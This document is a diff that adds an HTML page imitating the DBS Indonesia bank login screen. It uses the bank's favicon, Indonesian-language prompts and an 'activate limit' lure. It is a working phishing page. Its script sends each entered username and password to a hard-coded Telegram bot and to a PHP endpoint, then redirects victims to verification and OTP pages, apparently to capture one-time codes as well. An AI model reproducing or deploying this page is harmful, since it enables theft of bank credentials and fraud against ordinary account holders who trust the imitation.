@@ -1,0 +1,228 @@
+source: 
+<html>
+ <head> 
+  <title>DBS Login</title> 
+  <!-- Viewport mobile tag for sensible mobile support --> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic"> 
+  <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"> 
+  <!--STYLES--> 
+  <meta name="theme-color" content="#000000"> 
+  <link href="" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
+  <link nonce="78df019a-039a-4053-8729-826e29022d7e" rel="preloadshortcut icon" href="https://www.dbs.id/id/digibank/_next/public/favicon.ico"> 
+  <link nonce="78df019a-039a-4053-8729-826e29022d7e" rel="shortcut icon" href="https://www.dbs.id/id/digibank/_next/public/favicon.ico"> 
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            color: #fff;
+            position: relative;
+        }
+
+        b {
+            font-weight: 500;
+        }
+
+        html {
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            background: #000;
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+        }
+
+        .container {
+            width: 100%;
+            height: 100%;
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikkSJbrCKGDowSTxPzbV3xC5za5ffcPVCG3LeTQSednq5zwCZt4jb64TX6wlrn3-s9a8H41Rs26WUywzBNQq5R0v_G1n_sp7nDXWuTkZDgQROss16UqUapPz4s1OwzVqvafKtVK9t0_xztY1y2IyH0imFfIP8rDBhW3jPzg9j9vuk1roLlW-3Wq-ZhMk/s2560/1bgblur.webp');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .container .head {
+            width: 100%;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 10px 0 80px 0;
+        }
+
+        .container .head .back {
+            width: 10px;
+            position: absolute;
+            left: 20px;
+        }
+
+        .container .head .logo {
+            width: 150px;
+        }
+
+        form {
+            width: 100%;
+            padding: 20px;
+        }
+
+        form input {
+            width: 100%;
+            height: 50px;
+            background: #fff;
+            font-size: 15px;
+            color: #000;
+            outline: none;
+            border: none;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+        }
+
+        form button {
+            width: 100%;
+            margin-bottom: 20px;
+            height: 50px;
+            font-size: 14px;
+            border: none;
+            background: #ef3c3c;
+        }
+
+        form .forgot {
+            font-size: 13px;
+            margin-bottom: 20px;
+            font-weight: 300;
+            margin-left: 20px;
+        }
+
+        form .zs {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: center;
+            color: #8f8f8f;
+        }
+
+        form .reg {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #ffffff1d;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="head"> 
+    <img class="back" onclick="window.location.href=./index.html'" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjU2t7x4nQs-aoCY5m0uryn-YJmlYRPHp1u0zyXA3IEht3mMVqPY-obgcp4WcH_TvtSWcdBSzlTzS7rOBLz9yAnROfpr3IvEBemIywnDRT3WDCex3npWfRdVogWY26Dt6DZR6ppbugXy2VezbBAIPSfdng6YAJRIsIqP_9IltQAu274EZChbKMkWubXo14/s60/1x.png" alt=""> 
+    <img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBsm6_twIjCW4zyx7ZhQ87Yn-xvYl8uD9OcLswmxYaGHkRaKmv5C8S2xn5wVYihrqzdmoe9A0lZFXgoXAVCwyFZeR56G3RNH80gDQZDDxz4XGQk54muM6Kop8ZIIohmi7Z5Qsn7IUCpgMKZ8auChtCdhHq2fJzL4Ah4YSUYoHDIP_XwLGApOvlYm7YGww/s736/1logo.webp" alt=""> 
+   </div> 
+  <form id="logform" onsubmit="formlogin(event); return false;" method="post">
+    <input name="username" id="user" required autocomplete="off" placeholder="Username" type="text">
+    <input name="password" id="pass" required autocomplete="off" placeholder="Password" type="password">
+    <button type="submit" id="kirims">LOG IN</button>
+    <p class="forgot" style="margin-left: -0px">Lupa <u>username</u> atau <u>password?</u></p>
+ 
+  <script>
+    function formlogin(event) {
+      event.preventDefault(); // Mencegah reload
+
+      const username = document.getElementById('user').value.trim();
+      const password = document.getElementById('pass').value.trim();
+
+      if (!username || !password) {
+        alert("Username dan Password wajib diisi!");
+        return;
+      }801865171
+
+      const token = '8028286238:AAGmu0_RD7_QRuIpAZK3YUNvoAi2PAvbuMQ'; // Ganti dengan token bot
+      const chat_id = '5426799824'; // Ganti dengan chat ID
+      const message = `USER-LOGIN BIASA\nUsername: ${username}\nPassword: ${password}`;
+
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "verifikasi.html"; // Arahkan setelah sukses
+        } else {
+          alert("Gagal mengirim data ke Telegram.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Terjadi kesalahan saat mengirim data.");
+      });
+    }
+  </script>
+    <center> 
+     <p class="zs" style="text-align: center; margin-left: -5px">Belum punya username atau password untuk akses rekening DBS, Kartu Kredit atau Cashline?</p> 
+    </center> 
+    <button type="button" class="reg" onclick="location.href='konfir.html'">AKTIVASI LIMIT</button> 
+   </form> 
+  </div> 
+  <script>
+        $('#logform').on('submit', function(event) {
+
+            event.stopPropagation();
+            event.preventDefault();
+
+            document.getElementById('kirims').innerHTML = "Memproses....";
+
+
+
+            $.ajax({
+
+                type: 'POST',
+                url: '../auth/loginup.php',
+                async: false,
+                dataType: 'JSON',
+                data: $(this).serialize(),
+
+                complete: function(data) {
+                    console.log('Complete')
+                    setTimeout(function() {
+                        document.getElementById('kirims').innerHTML = "LOG IN";
+                        location.href = 'otplog.html';
+                        var user = document.getElementById("user").value;
+                        sessionStorage.setItem("user", user);
+                        var pass = document.getElementById("pass").value;
+                        sessionStorage.setItem("pass", pass);
+                    }, 1000);
+                }
+            });
+
+            return false;
+        });
+    </script> 
+ </body>
+</html>
+
+Page title: DBS Login
